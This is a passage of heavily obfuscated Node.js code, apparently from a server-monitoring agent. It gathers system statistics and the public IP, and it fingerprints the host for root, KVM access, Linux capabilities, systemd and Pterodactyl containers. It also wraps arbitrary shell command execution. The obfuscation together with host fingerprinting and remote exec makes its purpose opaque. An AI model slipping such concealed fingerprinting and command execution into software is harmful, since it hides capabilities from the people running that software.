        try {
            b = (await a0u['fsSize']())[0x0]?.[ff(0xd76)] || 0x0;
        } catch (d) {
            a0R[ff(0xb89)](ff(0xe9d)['concat'](d['message']), 0x1);
        }
        let c = {
            'total': 0x0,
            'swaptotal': 0x0
        };
        try {
            c = await this[ff(0x106)]() || c;
        } catch (f) {
            a0R[ff(0xb89)]('获取内存信息失败:\x20'[ff(0x7b6)](f['message']), 0x1);
        }
        return {
            'disk_total': b,
            'mem_total': c['total'] || 0x0,
            'swap_total': c[ff(0x9ab)] || 0x0
        };
    }
    async [a0d0(0xc98)]() {
        const fg = a0d0, a = {
                'VaSJO': function (d, f) {
                    return d === f;
                },
                'qKPcs': fg(0xe49),
                'ORnoO': function (d, f) {
                    return d === f;
                },
                'SSHuV': function (d, f) {
                    return d === f;
                },
                'eVzrr': fg(0xddb)
            }, [b, c] = await Promise['allSettled']([
                this[fg(0x921)](),
                this[fg(0x497)]()
            ]);
        if (a[fg(0x46e)](b[fg(0xab3)], a[fg(0xabb)]))
            a0R['debug'](fg(0xcd7)[fg(0x7b6)](b[fg(0x9d6)]), 0x1);
        if (a[fg(0x44a)](c[fg(0xab3)], a[fg(0xabb)]))
            a0R[fg(0xb89)]('获取\x20IPv6\x20失败:\x20'[fg(0x7b6)](c[fg(0x9d6)]), 0x1);
        return {
            'ipv4': a[fg(0x957)](b[fg(0xab3)], a['eVzrr']) ? b['value'] : null,
            'ipv6': a[fg(0x957)](c[fg(0xab3)], a[fg(0x114)]) ? c[fg(0xc44)] : null
        };
    }
    static [a0d0(0xcc7)] = a0d0(0x4c0);
    static [a0d0(0xa2e)] = a0d0(0xe2f);
    static ['MARKS_ETC_ROOT'] = a0d0(0x916);
    static [a0d0(0x981)] = '/run';
    static [a0d0(0xcee)] = '/';
    [a0d0(0x705)]() {
        const fh = a0d0, a = {
                'xhVeJ': function (d, f) {
                    return d === f;
                },
                'fPfJn': fh(0xbe),
                'tPuSB': fh(0x943),
                'whNha': 'kvm',
                'JtfLG': fh(0x4b9),
                'AkKCt': 'fuse',
                'Cmuhj': fh(0x9d2),
                'rOvnh': fh(0x41d),
                'iCktZ': fh(0x189),
                'tdMIL': fh(0xcd2),
                'KgbKX': fh(0x3d2)
            }, b = [];
        if (a[fh(0x25d)](process[fh(0x109)], a[fh(0x1e9)])) {
            const d = [
                [
                    a[fh(0xa8a)],
                    () => this['_markRoot']()
                ],
                [
                    a[fh(0x256)],
                    () => this[fh(0xaf2)]()
                ],
                [
                    a[fh(0x1fa)],
                    () => this[fh(0x473)]()
                ],
                [
                    'systemd',
                    () => this[fh(0xd55)]()
                ],
                [
                    a[fh(0x31d)],
                    () => this[fh(0xda9)]()
                ],
                [
                    a[fh(0xe2d)],
                    () => this[fh(0x6bd)]()
                ]
            ];
            for (const [f, g] of d) {
                try {
                    if (g())
                        b[fh(0x59a)](f);
                } catch (h) {
                    a0R['debug']('marks\x20探测失败\x20['['concat'](f, fh(0x146))[fh(0x7b6)](h[fh(0xf18)]), 0x1);
                }
            }
        }
        const c = [
            [
                a[fh(0x442)],
                () => this[fh(0xc22)]()
            ],
            [
                fh(0xb97),
                () => this[fh(0x556)]()
            ],
            [
                a['iCktZ'],
                () => this['_markKmode2']()
            ],
            [
                a[fh(0x641)],
                () => this['_markKmode3']()
            ]
        ];
        for (const [i, j] of c) {
            try {
                if (j())
                    b[fh(0x59a)](i);
            } catch (k) {
                a0R['debug'](fh(0x83d)[fh(0x7b6)](i, fh(0x146))[fh(0x7b6)](k[fh(0xf18)]), 0x1);
            }
        }
        return a0R['debug'](fh(0x9d8)[fh(0x7b6)](b['join'](',') || a[fh(0x8ea)]), 0x1), b;
    }
    [a0d0(0xc22)]() {
        const fi = a0d0, a = {
                'btQNF': function (b, c) {
                    return b === c;
                }
            };
        return a['btQNF'](a0aN[fi(0xb3d)][fi(0xbe3)], !![]);
    }
    [a0d0(0x556)]() {
        const fj = a0d0, a = {
                'aEvwZ': function (b, c) {
                    return b === c;
                }
            };
        return a['aEvwZ'](a0ax[fj(0xa6a)], '1');
    }
    [a0d0(0xd46)]() {
        const fk = a0d0, a = {
                'UolHT': function (b, c) {
                    return b === c;
                }
            };
        return a[fk(0x95f)](a0ax[fk(0xa6a)], '2');
    }
    ['_markKmode3']() {
        const fl = a0d0, a = {
                'jSHkh': function (b, c) {
                    return b === c;
                }
            };
        return a[fl(0x95d)](a0ax[fl(0xa6a)], '3');
    }
    ['_markRoot']() {
        const fm = a0d0, a = {
                'FniRi': function (b, c) {
                    return b !== c;
                },
                'yZkix': fm(0x6c3),
                'mqsTi': function (b, c) {
                    return b !== c;
                },
                'oHqDE': function (b, c) {
                    return b === c;
                },
                'JSuRU': function (b, c) {
                    return b === c;
                }
            };
        if (a[fm(0x9fc)](typeof process[fm(0xf2a)], a[fm(0xea8)]) || a[fm(0x5a2)](typeof process[fm(0x56b)], a[fm(0xea8)]))
            return ![];
        return a[fm(0x4b4)](process[fm(0xf2a)](), 0x0) && a[fm(0x3f5)](process[fm(0x56b)](), 0x0);
    }
    [a0d0(0xaf2)]() {
        const fn = a0d0, a = { 'OlMry': 'kvm' };
        return a0aI[fn(0x8bd)](a0o[fn(0x782)](a0aI[fn(0xa2e)], a['OlMry']), 0xa, 0xe8);
    }
    [a0d0(0xda9)]() {
        const fo = a0d0, a = {
                'XDrZN': fo(0xa4),
                'TJbrL': fo(0xc34),
                'CyjRL': fo(0x20a),
                'PwFjH': function (b, c) {
                    return b & c;
                }
            };
        if (!a0aI['_charDeviceRW'](a0o[fo(0x782)](a0aI['MARKS_DEV_ROOT'], a[fo(0x2f5)]), 0xa, 0xe5))
            return ![];
        if (this['_capEffBit'](0x15))
            return !![];
        for (const b of [
                fo(0x2af),
                a['TJbrL'],
                fo(0xe8e),
                a[fo(0xbb5)]
            ]) {
            try {
                const c = a0l['statSync'](a0o[fo(0x782)](a0aI[fo(0xcee)], b));
                if (c[fo(0xdf2)]() && a['PwFjH'](c['mode'], 0x800) && a[fo(0x4b0)](c['mode'], 0x49))
                    return !![];
            } catch {
            }
        }
        return ![];
    }
    [a0d0(0x6bd)]() {
        const fp = a0d0;
        return this[fp(0x237)](0xc);
    }
    [a0d0(0x473)]() {
        const fq = a0d0, a = {
                'CAIrI': fq(0x63b),
                'hImSB': fq(0xa26),
                'RfXBi': 'utf8',
                'yCxCw': fq(0x1de),
                'sSfBK': fq(0xa0f),
                'tbmry': function (g, h) {
                    return g !== h;
                },
                'hwgaE': 'function',
                'kCtWT': fq(0x569),
                'seUfY': function (g, h) {
                    return g === h;
                },
                'oKqjN': fq(0xea0),
                'xWnDL': fq(0x29e)
            };
        if (a0aI[fq(0xf4)](a0o['join'](a0aI['MARKS_PROC_ROOT'], fq(0xa26), 'mountinfo'), Buffer['from'](a['CAIrI'])))
            return !![];
        for (const g of [
                a[fq(0xac6)],
                '1'
            ]) {
            const h = a0aI[fq(0xbaf)](a0o[fq(0x782)](a0aI[fq(0xcc7)], g, fq(0xc71)));
            if (!h)
                continue;
            const i = h['toString'](a['RfXBi'])[fq(0xc0)]('\x00'), j = i[fq(0x696)](l => l[fq(0x46a)]('P_SERVER_UUID=')), k = i['some'](l => l[fq(0x46a)]('P_SERVER_LOCATION='));
            if (j && k)
                return !![];
        }
        const b = a0aI[fq(0xbaf)](a0o['join'](a0aI[fq(0x590)], a['yCxCw']));
        if (!b)
            return ![];
        const c = b[fq(0xa27)](fq(0x132))[fq(0x27f)]()[fq(0x777)]();
        if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/['test'](c))
            return ![];
        try {
            if (!a0l[fq(0x9a5)](a0o[fq(0x782)](a0aI[fq(0xcee)], fq(0x4fc), a[fq(0x83b)]))['isDirectory']())
                return ![];
        } catch {
            return ![];
        }
        if (a['tbmry'](typeof process[fq(0xf2a)], a[fq(0xad8)]))
            return ![];
        const d = process['geteuid'](), f = a0aI[fq(0xbaf)](a0o[fq(0x782)](a0aI[fq(0x590)], a[fq(0xb7a)]));
        if (!f)
            return ![];
        for (const l of f['toString'](a[fq(0x9d5)])['split']('\x0a')) {
            const m = l[fq(0xc0)](':');
            if (m['length'] > 0x2 && a[fq(0x96d)](Number(m[0x2]), d))
                return ![];
        }
        return a0l['existsSync'](a0o[fq(0x782)](a0aI[fq(0xcee)], a['oKqjN'])) || a0l[fq(0x7d2)](a0o[fq(0x782)](a0aI['MARKS_RUN_ROOT'], a[fq(0x99c)]));
    }
    [a0d0(0xd55)]() {
        const fr = a0d0, a = {
                'eWDui': fr(0xe8d),
                'yJpXA': fr(0x103),
                'oXXiq': fr(0xd80),
                'ePeKq': 'system_bus_socket',
                'eNKUk': fr(0x132),
                'GesTx': 'exe'
            };
        try {
            if (!a0l[fr(0x9a5)](a0o[fr(0x782)](a0aI[fr(0x981)], fr(0xe8d), fr(0x17c)))[fr(0xa43)]())
                return ![];
        } catch {
            return ![];
        }
        if (!a0l['existsSync'](a0o[fr(0x782)](a0aI[fr(0x981)], a[fr(0x555)], a[fr(0x991)])) && !a0l[fr(0x7d2)](a0o[fr(0x782)](a0aI[fr(0x981)], a[fr(0x632)], a['ePeKq'])))
            return ![];
        if (!a0aI[fr(0xed6)]())
            return ![];
        const b = a0aI[fr(0xbaf)](a0o['join'](a0aI[fr(0xcc7)], '1', 'comm'));
        if (b) {
            const c = b[fr(0xa27)](a['eNKUk'])['trim']();
            if (c)
                return c[fr(0x777)]()['includes'](a[fr(0x555)]);
        }
        try {
            const d = a0l[fr(0xa00)](a0o[fr(0x782)](a0aI[fr(0xcc7)], '1', a['GesTx']));
            if (d && !a0o[fr(0x2ed)](d)['toLowerCase']()[fr(0xd32)]('systemd'))
                return ![];
        } catch {
        }
        return !![];
    }
    [a0d0(0x237)](a) {
        const ft = a0d0, b = {
                'lVwKa': 'self',
                'CNJKA': 'status',
                'UeJpp': ft(0x132),
                'yPlDi': function (d, f) {
                    return d < f;
                },
                'ZRCmt': function (d, f) {
                    return d === f;
                },
                'oIkSe': function (d, f) {
                    return d & f;
                },
                'bGgOr': function (d, f) {
                    return d + f;
                },
                'oxmaX': function (d, f) {
                    return d(f);
                }
            }, c = a0aI[ft(0xbaf)](a0o[ft(0x782)](a0aI[ft(0xcc7)], b[ft(0xecf)], b[ft(0xca)]));
        if (!c)
            return ![];
        for (const d of c[ft(0xa27)](b[ft(0x9bc)])[ft(0xc0)]('\x0a')) {
            if (d[ft(0x46a)]('CapEff:')) {
                const f = d[ft(0xc0)](/\s+/);
                if (b[ft(0x181)](f[ft(0x615)], 0x2))
                    return ![];
                try {
                    return b[ft(0xa9c)](b[ft(0xebd)](BigInt(b[ft(0x57b)]('0x', f[0x1])) >> b[ft(0xaa1)](BigInt, a), 0x1n), 0x1n);
                } catch {
                    return ![];
                }
            }
        }
        return ![];
    }
    static [a0d0(0xed6)]() {
        const fu = a0d0, a = {
                'KDFow': 'usr/bin/systemctl',
                'tTaCw': fu(0x8e9),
                'YDtvC': fu(0x946)
            };
        for (const b of [
                a['KDFow'],
                a['tTaCw'],
                a[fu(0xef7)]
            ]) {
            if (a0aI[fu(0x389)](a0o['join'](a0aI[fu(0xcee)], b)))
                return !![];
        }
        for (const c of (process.env.PATH || '')[fu(0xc0)](a0o[fu(0x932)])) {
            if (c && a0aI[fu(0x389)](a0o['join'](c, fu(0xbae))))
                return !![];
        }
        return ![];
    }
    static [a0d0(0x389)](a) {
        const fv = a0d0, b = {
                'KUNWe': function (c, d) {
                    return c !== d;
                },
                'heNaN': function (c, d) {
                    return c & d;
                }
            };
        try {
            const c = a0l[fv(0x9a5)](a);
            return c[fv(0xdf2)]() && b[fv(0x317)](b[fv(0xeee)](c[fv(0x3d3)], 0x49), 0x0);
        } catch {
            return ![];
        }
    }
    static [a0d0(0x8bd)](a, b, c) {
        const fw = a0d0, d = {
                'oyLDQ': function (f, g) {
                    return f !== g;
                }
            };
        try {
            const f = a0l[fw(0x9a5)](a);
            if (!f[fw(0xb02)]())
                return ![];
            if (d[fw(0x786)](a0aI[fw(0x807)](f[fw(0x8fc)]), b) || d[fw(0x786)](a0aI['_devMinor'](f[fw(0x8fc)]), c))
                return ![];
            const g = a0l[fw(0x5d0)](a, 'r+');
            try {
                return !![];
            } finally {
                a0l[fw(0x619)](g);
            }
        } catch {
            return ![];
        }
    }
    static [a0d0(0x807)](a) {
        const fx = a0d0, b = {
                'aGhQz': function (f, g) {
                    return f % g;
                },
                'nMURs': function (f, g) {
                    return f / g;
                },
                'nqrIq': function (f, g) {
                    return f >>> g;
                },
                'qYEWA': function (f, g) {
                    return f | g;
                },
                'jlLPK': function (f, g) {
                    return f & g;
                }
            }, c = b[fx(0x7d1)](Math[fx(0x69d)](a / 0x100), 0x1000), d = Math[fx(0x69d)](b[fx(0x86d)](a, 0x100000000));
        return b[fx(0x20b)](b['qYEWA'](c, b['jlLPK'](d, ~0xfff)), 0x0);
    }
    static [a0d0(0x370)](a) {
        const fy = a0d0, b = {
                'mXgrP': function (f, g) {
                    return f % g;
                },
                'iEdmU': function (f, g) {
                    return f & g;
                },
                'JGZvc': function (f, g) {
                    return f % g;
                },
                'HoybV': function (f, g) {
                    return f >>> g;
                },
                'DHjyq': function (f, g) {
                    return f | g;
                }
            }, c = b['mXgrP'](a, 0x100), d = b[fy(0x67b)](b[fy(0x1e6)](Math[fy(0x69d)](a / 0x1000), 0x100000), 0xfff00);
        return b[fy(0x55f)](b[fy(0x710)](c, d), 0x0);
    }
    static ['_readLimited'](a, b = 0x400 * 0x400) {
        const fz = a0d0, c = {
                'uSlgD': function (f, g) {
                    return f < g;
                },
                'oNHbY': function (f, g) {
                    return f - g;
                },
                'lmSml': function (f, g) {
                    return f !== g;
                }
            };
        let d = null;
        try {
            d = a0l[fz(0x5d0)](a, 'r');
            const f = Buffer['alloc'](0x2000), g = [];
            let h = 0x0;
            while (c[fz(0x941)](h, b)) {
                const i = a0l[fz(0xda7)](d, f, 0x0, Math[fz(0xb66)](f[fz(0x615)], c['oNHbY'](b, h)), null);
                if (!i)
                    break;
                g[fz(0x59a)](Buffer[fz(0x58d)](f[fz(0x3d1)](0x0, i))), h += i;
            }
            return Buffer['concat'](g);
        } catch {
            return null;
        } finally {
            if (c[fz(0x4d4)](d, null))
                try {
                    a0l[fz(0x619)](d);
                } catch {
                }
        }
    }
    static [a0d0(0xf4)](a, b, c = 0x400 * 0x400, d = 0x2000) {
        const fA = a0d0, f = {
                'XaxuJ': function (h, i) {
                    return h - i;
                },
                'JbCRD': function (h, i) {
                    return h - i;
                },
                'djZpW': function (h, i) {
                    return h !== i;
                },
                'rxBiC': function (h, i) {
                    return h - i;
                }
            };
        let g = null;
        try {
            g = a0l['openSync'](a, 'r');
            const h = Math[fA(0x8b4)](0x0, f[fA(0x66f)](b[fA(0x615)], 0x1)), i = Buffer[fA(0xacf)](d);
            let j = Buffer[fA(0xacf)](0x0), k = 0x0;
            while (k < c) {
                const l = a0l[fA(0xda7)](g, i, 0x0, Math[fA(0xb66)](d, f[fA(0xb9c)](c, k)), null);
                if (!l)
                    break;
                k += l;
                const m = Buffer[fA(0x7b6)]([
                    j,
                    i[fA(0x3d1)](0x0, l)
                ]);
                if (f[fA(0x246)](m[fA(0x44f)](b), -0x1))
                    return !![];
                j = h ? Buffer[fA(0x58d)](m[fA(0x3d1)](Math[fA(0x8b4)](0x0, f[fA(0xd88)](m[fA(0x615)], h)))) : Buffer[fA(0xacf)](0x0);
            }
            return ![];
        } catch {
            return ![];
        } finally {
            if (f[fA(0x246)](g, null))
                try {
                    a0l[fA(0x619)](g);
                } catch {
                }
        }
    }
    [a0d0(0x854)]() {
        const fB = a0d0, a = {
                'LgxBM': function (c, d) {
                    return c === d;
                },
                'RejuK': 'IPv4'
            }, b = a0p[fB(0x8cf)]();
        for (const c of Object[fB(0x30b)](b)) {
            for (const d of b[c]) {
                const f = a[fB(0x82a)](d[fB(0xdee)], a[fB(0x598)]) || d['family'] === 0x4;
                if (f && !d[fB(0x435)]) {
                    if (!/^10\./[fB(0xdbb)](d[fB(0xd5)]) && !/^192\.168\./[fB(0xdbb)](d[fB(0xd5)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[fB(0xdbb)](d['address']))
                        return d[fB(0xd5)];
                }
            }
        }
        return null;
    }
    async ['getPublicIpV4']() {
        const fC = a0d0, a = {
                'XzHfu': fC(0x3b9),
                'KDkaW': fC(0xe28),
                'bViyg': fC(0x4c8),
                'nnUqg': fC(0x662),
                'jJhnj': 'https://ipinfo.io/ip',
                'jDfsr': fC(0x2b7)
            }, b = [
                fC(0x282),
                a['XzHfu'],
                a[fC(0xc7b)],
                a[fC(0x41e)],
                a[fC(0xab)],
                a[fC(0x24f)],
                a['jDfsr']
            ];
        for (const d of b) {
            try {
                const f = await this[fC(0xf0d)](d, 0x4);
                if (f && this[fC(0x5bd)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[fC(0x854)]();
        if (c && this['isValidIPv4'](c))
            return c;
        return null;
    }
    [a0d0(0x253)]() {
        const fD = a0d0, a = {
                'rWPTF': function (c, d) {
                    return c === d;
                },
                'NXOiz': fD(0xdb),
                'TlTtN': function (c, d) {
                    return c === d;
                },
                'COacx': fD(0xb1a)
            }, b = a0p[fD(0x8cf)]();
        for (const c of Object[fD(0x30b)](b)) {
            for (const d of b[c]) {
                const f = a[fD(0x10b)](d['family'], a[fD(0x45c)]) || a['TlTtN'](d['family'], 0x6);
                if (f && !d[fD(0x435)]) {
                    if (!d[fD(0xd5)][fD(0x777)]()[fD(0x46a)](a[fD(0x308)]))
                        return d[fD(0xd5)];
                }
            }
        }
        return null;
    }
    async [a0d0(0x497)]() {
        const fE = a0d0, a = {
                'IhDOg': fE(0xeef),
                'ltPqj': fE(0x3b9),
                'BylsK': fE(0x8b9)
            }, b = this[fE(0x253)]();
        if (b && this[fE(0xbfd)](b))
            return b;
        const c = [
            a[fE(0x94a)],
            a[fE(0x2be)],
            a[fE(0xc21)]
        ];
        for (const d of c) {
            try {
                const f = await this[fE(0xf0d)](d, 0x6);
                if (f && this[fE(0xbfd)](f))
                    return f;
            } catch (g) {
                a0R['debug'](fE(0xa02)[fE(0x7b6)](d, fE(0x91d))[fE(0x7b6)](g[fE(0xf18)]));
                continue;
            }
        }
        return null;
    }
    async [a0d0(0xf0d)](a, b = 0x0) {
        const fF = a0d0, c = {
                'xTYpA': function (d, f) {
                    return d(f);
                },
                'rcytm': fF(0x426),
                'FMDho': function (d, f) {
                    return d(f);
                },
                'FtoYh': fF(0xfe),
                'xOXfu': fF(0x98e),
                'oBRWn': 'error'
            };
        return new Promise((d, f) => {
            const fH = fF, g = {
                    'zfVvE': function (k, l) {
                        const fG = a0b;
                        return c[fG(0x33f)](k, l);
                    },
                    'EGiLC': c[fH(0x498)]
                }, h = c[fH(0xa56)](require, c[fH(0x9f7)]), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c[fH(0x583)] }
                }, j = h['get'](a, i, k => {
                    const fI = fH;
                    let l = '';
                    if (k[fI(0x12e)] !== 0xc8) {
                        g[fI(0xf20)](f, new Error(fI(0x54d)[fI(0x7b6)](k[fI(0x12e)])));
                        return;
                    }
                    k['on'](g[fI(0x63e)], m => l += m), k['on'](fI(0x65c), () => d(l[fI(0x27f)]()));
                });
            j['on'](c['oBRWn'], f), j[fH(0xdb6)](0x1388, () => {
                const fJ = fH;
                j[fJ(0x4d7)](), g[fJ(0xf20)](f, new Error('请求超时'));
            });
        });
    }
    [a0d0(0x5bd)](a) {
        const fK = a0d0;
        return /^(\d{1,3}\.){3}\d{1,3}$/[fK(0xdbb)](a);
    }
    ['isValidIPv6'](a) {
        const fL = a0d0;
        if (!/^[0-9a-fA-F:]+$/[fL(0xdbb)](a) || !a[fL(0xd32)](':'))
            return ![];
        const b = a['split'](':')[0x0];
        return /^[23][0-9a-fA-F]{3}$/['test'](b);
    }
    async [a0d0(0x65f)]() {
        const fM = a0d0, a = {
                'yEPOL': function (m, n) {
                    return m / n;
                },
                'ETgov': function (m, n) {
                    return m - n;
                },
                'UXXIl': function (m, n) {
                    return m - n;
                },
                'qVDHI': function (m, n) {
                    return m / n;
                },
                'kFEfv': function (m, n) {
                    return m * n;
                },
                'hSCBm': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[fM(0xb59)]([
                a0u[fM(0x8d3)](),
                a0u['mem'](),
                a0u['networkStats'](),
                a0u[fM(0x8d3)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[fM(0x276)](Date[fM(0x430)](), 0x3e8), i = a[fM(0x7eb)](h, this[fM(0xada)]), j = a[fM(0x7eb)](g[fM(0x951)], this[fM(0xd95)]['tx']), k = a[fM(0x180)](g[fM(0xac0)], this[fM(0xd95)]['rx']);
        this[fM(0x6c2)] += j, this['totalNetworkDown'] += k, this[fM(0xd95)] = {
            'tx': g[fM(0x951)],
            'rx': g['rx_bytes']
        }, this[fM(0xada)] = h;
        const l = await a0u[fM(0xb74)]();
        return {
            'cpu': { 'usage': Math['round'](b[fM(0x8d3)]) },
            'ram': {
                'total': c[fM(0x383)],
                'used': c[fM(0xe62)]
            },
            'swap': {
                'total': c[fM(0x9ab)],
                'used': c[fM(0xc47)]
            },
            'load': {
                'load1': a['qVDHI'](Math[fM(0x7f3)](a[fM(0xe3f)](f['avgLoad'], 0x64)), 0x64),
                'load5': Math[fM(0x7f3)](a[fM(0xe3f)](f[fM(0xdfa)], 0x64)) / 0x64,
                'load15': Math['round'](f[fM(0xdfa)] * 0x64) / 0x64
            },
            'disk': await this['_getDiskInfo'](),
            'network': {
                'up': Math[fM(0x7f3)](a[fM(0x8c9)](j, i)),
                'down': Math[fM(0x7f3)](a[fM(0xeeb)](k, i)),
                'totalUp': this[fM(0x6c2)],
                'totalDown': this[fM(0x38b)]
            },
            'connections': await this[fM(0x1ee)](),
            'uptime': a0p[fM(0xa0a)](),
            'process': l?.[fM(0xb59)] || 0x0,
            'message': ''
        };
    }
    async [a0d0(0x301)]() {
        const fN = a0d0, a = {
                'toLug': fN(0xd2d),
                'odCXP': fN(0xe1e),
                'kwUQr': fN(0x98f),
                'FwhVx': fN(0x7c9),
                'VYmEK': 'utf8',
                'Negkt': fN(0x178),
                'mRPZw': fN(0x9a3),
                'uqtdL': fN(0x5c1),
                'vXfnV': fN(0x56a),
                'Jwhnd': fN(0x6de),
                'WXfeJ': fN(0x858),
                'jKWAM': fN(0xb7e),
                'LnxaU': fN(0x391),
                'rfdoq': fN(0x6fb),
                'yPMFo': fN(0x5c6),
                'ySELw': fN(0xfa),
                'bMWIy': 'KVM',
                'jWOvo': 'None'
            };
        try {
            if (a0l['existsSync'](fN(0x844)))
                return a[fN(0x629)];
            if (a0l[fN(0x7d2)](a[fN(0xa33)]))
                return a[fN(0xf04)];
            if (a0l[fN(0x7d2)](a[fN(0x79a)])) {
                const b = a0l[fN(0x902)](a['FwhVx'], a['VYmEK'])['toLowerCase']();
                if (b[fN(0xd32)](a[fN(0x1bd)]) || b[fN(0xd32)](a['mRPZw']))
                    return a['toLug'];
                else {
                    if (b[fN(0xd32)](a[fN(0x8af)]))
                        return a['vXfnV'];
                    else {
                        if (b[fN(0xd32)](a[fN(0x118)]))
                            return a['WXfeJ'];
                    }
                }
            }
            if (a0l[fN(0x7d2)](a[fN(0x76b)])) {
                const c = a0l[fN(0x902)](a['jKWAM'], a['VYmEK']);
                if (c[fN(0xd32)](fN(0xdec)) || c[fN(0xd32)](fN(0x716)))
                    return a[fN(0x629)];
                else {
                    if (c[fN(0xd32)]('/pods/') || c[fN(0xd32)](a[fN(0x364)]))
                        return a[fN(0x2ca)];
                }
            }
            if (a0l['existsSync'](a[fN(0x9ae)])) {
                const d = a0l['readFileSync']('/proc/1/environ', a['VYmEK']);
                if (d[fN(0xd32)](fN(0x573)))
                    return a[fN(0xc4c)];
            }
            if (a0l['existsSync'](a[fN(0x869)])) {
                const f = a0l[fN(0x902)](a[fN(0x869)], a['VYmEK']);
                if (f[fN(0xd32)](a[fN(0x24a)]) || f['includes'](a['bMWIy']))
                    return a[fN(0x24a)];
            }
        } catch (g) {
        }
        return a[fN(0x911)];
    }
    async [a0d0(0xe65)]() {
        const fO = a0d0, a = {
                'uAElL': function (b, c) {
                    return b > c;
                },
                'nEvKT': 'tmpfs',
                'CsgHF': function (b, c) {
                    return b !== c;
                },
                'JYedv': fO(0xb40)
            };
        try {
            const b = await a0u[fO(0x64d)](), c = b['filter'](g => {
                    const fP = fO;
                    return a[fP(0xb37)](g[fP(0xd76)], 0x0) && g['type'] !== a[fP(0xeed)] && a[fP(0x273)](g['type'], 'overlay') && g['fs'][fP(0x46a)](a['JYedv']);
                }), d = c[fO(0xea6)]((g, h) => g + h[fO(0xd76)], 0x0), f = c[fO(0xea6)]((g, h) => g + h[fO(0x554)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0d0(0x1ee)]() {
        const fQ = a0d0;
        try {
            const a = await a0u[fQ(0xba)](), b = a[fQ(0x74d)](d => d['protocol'] === fQ(0x26b))['length'], c = a[fQ(0x74d)](d => d[fQ(0xcf9)] === fQ(0x2d3))[fQ(0x615)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
function a0b(a, b) {
    a = a - 0xa3;
    const c = a0a();
    let d = c[a];
    if (a0b['FWCLbF'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['JgNzhX'] = e, a0b['XwSLPg'] = {}, a0b['FWCLbF'] = !![];
    }
    const f = c[0x0];
    a0b['daDmDo'] !== f && (a0b['XwSLPg'] = {}, a0b['daDmDo'] = f);
    const g = a0b['XwSLPg'][a];
    return g === undefined ? (d = a0b['JgNzhX'](d), a0b['XwSLPg'][a] = d) : d = g, d;
}
class a0aJ {
    static async ['execute'](a, b = {}) {
        const fR = a0d0, c = {
                'pBtBP': function (d, f) {
                    return d || f;
                },
                'UwguK': function (d, f) {
                    return d === f;
                },
                'liHlE': function (d, f) {
                    return d(f);
                },
                'myFlr': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'prdhu': function (d, f) {
                    return d * f;
                },
                'NQttK': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[fR(0xc50)](),
                env: env = {},
                timeout: timeout = a0ax[fR(0x776)]
            } = b;
        return new Promise(d => {
            const fS = fR, f = Date[fS(0x430)](), g = c[fS(0x636)](a0r, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': timeout * 0x3e8,
                    'maxBuffer': c['prdhu'](c['NQttK'](0xa, 0x400), 0x400)
                }, (h, i, j) => {
                    const fT = fS, k = Date['now']() - f, l = h && h['killed'] && h[fT(0xaa4)];
                    let m = c[fT(0x955)](i, '');
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            c[fT(0x160)](typeof h[fT(0x46f)], 'number') ? n = h['code'] : n = -0x1;
                    }
                    c[fT(0x2e3)](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
function a0aK(a) {
    const fU = a0d0, b = {
            'eOVwR': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l[fU(0xe4f)]['native'](a0o[fU(0x983)](a0ax[fU(0x45b)])), d = a0o['resolve'](a);
        let f = d;
        while (!a0l[fU(0x7d2)](f)) {
            const j = a0o[fU(0x6af)](f);
            if (b[fU(0x75d)](j, f))
                return ![];
            f = j;
        }
        const g = a0l['realpathSync'][fU(0x6ad)](f), h = a0o[fU(0xeda)](c, g);
        if (h['startsWith']('..') || a0o[fU(0x876)](h))
            return ![];
        const i = a0o['relative'](f, d);
        if (i && (i[fU(0x46a)]('..') || a0o[fU(0x876)](i)))
            return ![];
        return !![];
    } catch (k) {
        return ![];
    }
}
class a0aL {
    static [a0d0(0x879)] = 0x4e20;
    static [a0d0(0xe83)] = 0x200 * 0x400 * 0x400;
    static ['ZIP_MAX_LISTED_FILES'] = 0x1f4;
    static [a0d0(0x5b3)] = null;
    static ['_crc32'](a) {
        const fV = a0d0, b = {
                'bQibp': function (g, h) {
                    return g < h;
                },
                'WoDtf': function (g, h) {
                    return g ^ h;
                },
                'wVuQR': function (g, h) {
                    return g >>> h;
                },
                'HmhWH': function (g, h) {
                    return g >>> h;
                },
                'zBrah': function (g, h) {
                    return g < h;
                },
                'ctbGy': function (g, h) {
                    return g >>> h;
                },
                'nUcrf': function (g, h) {
                    return g & h;
                },
                'qngJK': function (g, h) {
                    return g >>> h;
                }
            };
        if (!a0aL[fV(0x5b3)]) {
            const g = new Int32Array(0x100);
            for (let h = 0x0; h < 0x100; h++) {
                let j = h;
                for (let l = 0x0; b[fV(0x832)](l, 0x8); l++)
                    j = j & 0x1 ? b[fV(0x210)](0xedb88320, b[fV(0x6bf)](j, 0x1)) : b['HmhWH'](j, 0x1);
                g[h] = j;
            }
